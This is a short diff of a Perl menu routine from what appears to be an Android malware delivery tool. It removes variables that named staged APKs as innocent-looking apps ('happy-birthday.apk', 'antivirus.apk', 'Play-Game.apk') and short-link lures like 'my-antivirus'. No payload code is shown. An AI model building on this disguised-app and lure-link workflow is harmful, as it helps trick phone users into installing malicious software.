@@ -48,29 +48,19 @@ sub main_menu {
     if ($option eq "") {
         main_menu();
     } elsif ($option eq "01" || $option eq "1") {
-        my $app_name = "happy-birthday.apk";
-        my $sec_name = "xxx.apk";
         move_file();
     } elsif ($option eq "02" || $option eq "2") {
-        my $app_name = "antivirus.apk";
         move_file();
     } elsif ($option eq "03" || $option eq "3") {
-        my $app_name = "Play-Game.apk";
-        my $sec_name = "HellBoy.apk";
         move_file();
     } elsif ($option eq "04" || $option eq "4") {
-        my $app_name = "antivirus.apk";
-        my $sec_name = "Elite.apk";
         move_file();
     } elsif ($option eq "05" || $option eq "5") {
-        my $app_link = "my-antivirus";
-        short_link();
+       short_link();
     } elsif ($option eq "06" || $option eq "6") {
-        my $app_link = "Happy-BirthDay-Dear";
-        short_link();
+       short_link();
     } elsif ($option eq "07" || $option eq "7") {
-        my $app_link = "play-my-games";
-        short_link();
+       short_link();
     }
 }
 
